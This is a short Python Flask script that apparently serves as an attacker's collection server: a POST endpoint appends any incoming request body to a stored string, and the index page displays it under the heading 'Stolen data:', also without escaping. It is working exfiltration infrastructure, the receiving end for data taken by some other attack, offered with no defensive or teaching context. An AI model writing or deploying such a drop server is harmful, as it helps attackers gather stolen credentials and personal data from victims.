from flask import Flask,request,jsonify
app = Flask(__name__)
data = ""

@app.route("/post_data", methods=["POST"])
def post_data():
    global data
    data = data + "\n" + str(request.data)
    return jsonify(success=True)

@app.route("/", methods=["GET"])
def index():
    global data
    return "<h1>Stolen data:</h1>" + data

if __name__ == '__main__':
    app.run()

